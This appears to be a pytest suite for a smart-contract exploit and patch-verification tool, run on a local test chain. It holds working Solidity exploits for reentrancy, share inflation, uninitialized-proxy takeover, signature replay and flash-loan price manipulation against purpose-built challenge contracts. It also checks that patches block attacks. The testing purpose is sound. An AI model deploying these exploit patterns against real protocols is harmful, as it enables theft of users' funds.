"""Hand-written exploits prove the new targets are actually exploitable."""
import sys
from pathlib import Path

import pytest
from web3 import Web3

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from orchestrator import challenges, config
from orchestrator.chain import compile_source_code, deploy, get_web3
from orchestrator.executor import fallback_exploit
from orchestrator.outcome import is_drained, is_profitable
from orchestrator.sandbox import LocalSandbox
from orchestrator.setup import deploy_target

ONE = 10**18


def _anvil_available() -> bool:
    try:
        return get_web3(config.LOCAL_RPC_URL).is_connected()
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _anvil_available(), reason="Anvil not running")


def _exploit(w3, source: str, name: str, target: str, sender: str, value: int = 0):
    abi, bytecode = compile_source_code(source, name)
    attacker = deploy(w3, abi, bytecode, sender, constructor_args=[target])
    before = w3.eth.get_balance(target)
    attacker_before = w3.eth.get_balance(attacker.address) + w3.eth.get_balance(sender)
    tx_hash = attacker.functions.attack().transact({"from": sender, "value": value})
    w3.eth.wait_for_transaction_receipt(tx_hash)
    after = w3.eth.get_balance(target)
    attacker_after = w3.eth.get_balance(attacker.address) + w3.eth.get_balance(sender)
    return before, after, attacker_after - attacker_before


def test_cross_function_reentrancy_drains():
    w3 = get_web3(config.LOCAL_RPC_URL)
    target = challenges.get_target("CrossFunctionVault")
    entry = deploy_target(w3, target, w3.eth.accounts[0])
    source = """
    pragma solidity ^0.8.19;
    interface IVault {
        function deposit() external payable;
        function transfer(address to, uint256 amount) external;
        function withdraw() external;
        function balances(address) external view returns (uint256);
    }
    contract Helper {
        IVault vault;
        address sink;
        constructor(address v, address s) { vault = IVault(v); sink = s; }
        function pull() external { vault.withdraw(); }
        receive() external payable { (bool ok,) = sink.call{value: msg.value}(""); require(ok); }
    }
    contract CrossExploit {
        IVault vault;
        Helper helper;
        bool moved;
        constructor(address t) {
            vault = IVault(t);
            helper = new Helper(t, address(this));
        }
        function attack() external payable {
            vault.deposit{value: msg.value}();
            vault.withdraw();
            helper.pull();
        }
        receive() external payable {
            if (!moved) {
                moved = true;
                uint256 bal = vault.balances(address(this));
                if (bal > 0) vault.transfer(address(helper), bal);
            }
        }
        function withdraw() external {}
    }
    """
    before, after, gain = _exploit(
        w3, source, "CrossExploit", entry["address"], w3.eth.accounts[5], ONE
    )
    assert is_drained(before, after) or is_profitable(gain)


def test_hook_reentrancy_drains():
    w3 = get_web3(config.LOCAL_RPC_URL)
    target = challenges.get_target("HookVault")
    entry = deploy_target(w3, target, w3.eth.accounts[0])
    source = """
    pragma solidity ^0.8.19;
    interface IVault {
        function deposit() external payable;
        function withdraw() external;
    }
    contract HookExploit {
        IVault vault;
        uint256 calls;
        constructor(address t) { vault = IVault(t); }
        function attack() external payable {
            vault.deposit{value: msg.value}();
            vault.withdraw();
        }
        function tokensReceived(address, uint256) external {
            if (calls < 3 && address(vault).balance >= 1 ether) {
                calls += 1;
                vault.withdraw();
            }
        }
        receive() external payable {}
    }
    """
    before, after, gain = _exploit(
        w3, source, "HookExploit", entry["address"], w3.eth.accounts[5], ONE
    )
    assert is_drained(before, after) or is_profitable(gain)


def test_share_inflation_captures_the_next_deposit():
    w3 = get_web3(config.LOCAL_RPC_URL)
    target = challenges.get_target("InflatingVault")
    entry = deploy_target(w3, target, w3.eth.accounts[0])
    source = """
    pragma solidity ^0.8.19;
    interface IVault {
        function deposit() external payable;
        function donate() external payable;
        function withdraw() external;
    }
    contract InflateExploit {
        IVault vault;
        constructor(address t) { vault = IVault(t); }
        function attack() external payable {
            vault.deposit{value: 1}();
            vault.donate{value: msg.value - 1}();
        }
        function withdraw() external { vault.withdraw(); }
        receive() external payable {}
    }
    """
    sender = w3.eth.accounts[5]
    abi, bytecode = compile_source_code(source, "InflateExploit")
    attacker = deploy(w3, abi, bytecode, sender, constructor_args=[entry["address"]])
    before = w3.eth.get_balance(entry["address"])
    tx_hash = attacker.functions.attack().transact({"from": sender, "value": 10 * ONE})
    w3.eth.wait_for_transaction_receipt(tx_hash)
    victim = w3.eth.accounts[1]
    tx_hash = w3.eth.contract(
        address=entry["address"], abi=entry["abi"]
    ).functions.deposit().transact({"from": victim, "value": 5 * ONE})
    w3.eth.wait_for_transaction_receipt(tx_hash)
    tx_hash = attacker.functions.withdraw().transact({"from": sender})
    w3.eth.wait_for_transaction_receipt(tx_hash)
    after = w3.eth.get_balance(entry["address"])
    assert is_drained(before, after) or after < 5 * ONE


def test_uninitialized_proxy_can_be_taken():
    w3 = get_web3(config.LOCAL_RPC_URL)
    target = challenges.get_target("OpenProxy")
    entry = deploy_target(w3, target, w3.eth.accounts[0])
    source = """
    pragma solidity ^0.8.19;
    interface IProxy {
        function initialize() external;
        function withdrawAll() external;
    }
    contract ProxyExploit {
        IProxy vault;
        constructor(address t) { vault = IProxy(t); }
        function attack() external {
            vault.initialize();
            vault.withdrawAll();
        }
        receive() external payable {}
    }
    """
    before, after, gain = _exploit(
        w3, source, "ProxyExploit", entry["address"], w3.eth.accounts[5]
    )
    assert is_drained(before, after) or is_profitable(gain)


def test_signature_can_be_replayed():
    w3 = get_web3(config.LOCAL_RPC_URL)
    target = challenges.get_target("ReplayVault")
    entry = deploy_target(w3, target, w3.eth.accounts[0])
    obs = entry["context"]["observations"]
    source = f"""
    pragma solidity ^0.8.19;
    interface IVault {{
        function claim(uint256 amount, uint8 v, bytes32 r, bytes32 s) external;
    }}
    contract ReplayExploit {{
        IVault vault;
        constructor(address t) {{ vault = IVault(t); }}
        function attack() external {{
            vault.claim({obs['amount_wei']}, {obs['v']}, {obs['r']}, {obs['s']});
            vault.claim({obs['amount_wei']}, {obs['v']}, {obs['r']}, {obs['s']});
            vault.claim({obs['amount_wei']}, {obs['v']}, {obs['r']}, {obs['s']});
        }}
        receive() external payable {{}}
    }}
    """
    before, after, gain = _exploit(
        w3, source, "ReplayExploit", entry["address"], w3.eth.accounts[5]
    )
    assert is_drained(before, after) or is_profitable(gain)


def test_spot_price_flash_loan_profits():
    w3 = get_web3(config.LOCAL_RPC_URL)
    target = challenges.get_target("SpotLending")
    entry = deploy_target(w3, target, w3.eth.accounts[0])
    source = """
    pragma solidity ^0.8.19;
    interface IToken {
        function approve(address spender, uint256 amount) external;
        function balanceOf(address) external view returns (uint256);
    }
    interface IAMM {
        function swapExactEth() external payable returns (uint256);
        function swapExactToken(uint256 amountIn) external returns (uint256);
    }
    interface IPool {
        function amm() external view returns (address);
        function token() external view returns (address);
        function flashLender() external view returns (address);
        function depositCollateral(uint256 amount) external;
        function borrow() external;
    }
    interface IFlash {
        function flash(uint256 amount) external;
    }
    contract SpotExploit {
        IPool pool;
        constructor(address t) { pool = IPool(t); }
        function attack() external { IFlash(pool.flashLender()).flash(30 ether); }
        function onFlashLoan(uint256) external {
            IAMM amm = IAMM(pool.amm());
            IToken token = IToken(pool.token());
            amm.swapExactEth{value: 30 ether}();
            token.approve(address(pool), 1 ether);
            pool.depositCollateral(1 ether);
            pool.borrow();
            uint256 rest = token.balanceOf(address(this));
            token.approve(address(amm), rest);
            amm.swapExactToken(rest);
            (bool ok,) = msg.sender.call{value: 30 ether}("");
            require(ok, "repay");
        }
        receive() external payable {}
    }
    """
    before, after, gain = _exploit(
        w3, source, "SpotExploit", entry["address"], w3.eth.accounts[5]
    )
    assert is_drained(before, after) or is_profitable(gain)


def test_treasury_patch_is_verified_only_when_benign_use_survives():
    from orchestrator.patch_verify import verify_patch, build_replay_descriptor
    from orchestrator.patcher import PatchProposal
    from orchestrator.proposer import ExploitProposal
    from orchestrator.sandbox import LocalSandbox
    from orchestrator.setup import attach_context

    w3 = get_web3(config.LOCAL_RPC_URL)
    target = challenges.get_target("VulnerableTreasury")
    entry = deploy_target(w3, target, w3.eth.accounts[0])
    source = challenges.resolve_source("VulnerableTreasury")
    patched = source.replace(
        "function withdrawAll() external {\n        uint256 amount",
        'function withdrawAll() external {\n        require(msg.sender == owner, "not owner");\n        uint256 amount',
    )
    exploit_source = """
    pragma solidity ^0.8.19;
    interface ITreasury { function withdrawAll() external; }
    contract TreasuryExploit {
        ITreasury vault;
        constructor(address t) { vault = ITreasury(t); }
        function attack() external { vault.withdrawAll(); }
        receive() external payable {}
    }
    """
    abi, bytecode = compile_source_code(exploit_source, "TreasuryExploit")
    proposal = ExploitProposal(
        solidity_source=exploit_source,
        contract_name="TreasuryExploit",
        entry_function="attack",
        entry_value_wei=0,
        reasoning="missing caller check",
        abi=abi,
        bytecode=bytecode,
    )
    patch_abi, patch_bytecode = compile_source_code(patched, "VulnerableTreasury")
    patch = PatchProposal(
        patched_source=patched,
        contract_name="VulnerableTreasury",
        reasoning="owner check",
        abi=patch_abi,
        bytecode=patch_bytecode,
    )
    sandbox = LocalSandbox()
    attach_context(sandbox, entry)
    replay = build_replay_descriptor("VulnerableTreasury", proposal, False)
    verification = verify_patch(sandbox, replay, patch, w3.eth.accounts[0])
    assert verification.exploit_blocked
    assert verification.benign_ok
    assert verification.verified

    w3 = get_web3(config.LOCAL_RPC_URL)
    target = challenges.get_target("SafeInflatingVault")
    entry = deploy_target(w3, target, w3.eth.accounts[0])
    vault = w3.eth.contract(address=entry["address"], abi=entry["abi"])
    sender = w3.eth.accounts[5]
    tx_hash = vault.functions.deposit().transact({"from": sender, "value": 1})
    w3.eth.wait_for_transaction_receipt(tx_hash)
    tx_hash = vault.functions.donate().transact({"from": sender, "value": 10 * ONE})
    w3.eth.wait_for_transaction_receipt(tx_hash)
    tx_hash = vault.functions.deposit().transact(
        {"from": w3.eth.accounts[1], "value": 5 * ONE}
    )
    w3.eth.wait_for_transaction_receipt(tx_hash)
    tx_hash = vault.functions.withdraw().transact({"from": sender})
    w3.eth.wait_for_transaction_receipt(tx_hash)
    assert w3.eth.get_balance(entry["address"]) > 4 * ONE


def test_owner_withdraw_is_not_a_fallback_exploit():
    w3 = get_web3(config.LOCAL_RPC_URL)
    target = challenges.get_target("SafeTreasury")
    entry = deploy_target(w3, target, w3.eth.accounts[0])
    result, timing = fallback_exploit(
        LocalSandbox(),
        entry["address"],
        entry["abi"],
        w3.eth.accounts[0],
        target_name="SafeTreasury",
    )
    assert timing["strategy"] == "direct_withdrawAll"
    assert result.success is False
